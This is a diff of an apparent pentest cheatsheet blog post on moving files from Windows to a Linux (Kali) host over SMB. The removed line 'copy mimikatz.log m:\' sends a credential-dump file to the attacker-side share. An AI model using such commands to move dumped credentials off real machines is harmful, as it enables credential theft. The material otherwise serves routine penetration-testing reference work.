@@ -1,7 +1,7 @@
 ---
 layout: post
 title: Windows to Linux File Transfers
-tag: [reference]
+tag: [cheatsheet]
 ---
 
 ![](https://imgs.xkcd.com/comics/file_transfer.png)
@@ -14,14 +14,14 @@ Here are the methods:
 ## SMB: 
 Start server on linux:
 ```bash
-impacket-smbserver test . -smb2support  -username USERNAME -password PASSWORD
+impacket-smbserver MyShareName . -smb2support  -username USERNAME -password PASSWORD
 ```
 
 then in Windows:
 ```powershell
-net use m: \\Kali_IP\sharename /user:USERNAME PASSWORD
+net use m: \\Kali_IP\MyShareName /user:USERNAME PASSWORD
 
-copy mimikatz.log m:\
+copy \path\to\local\file m:\
 ```
 
 ## RDP: Mounting Shared Folders
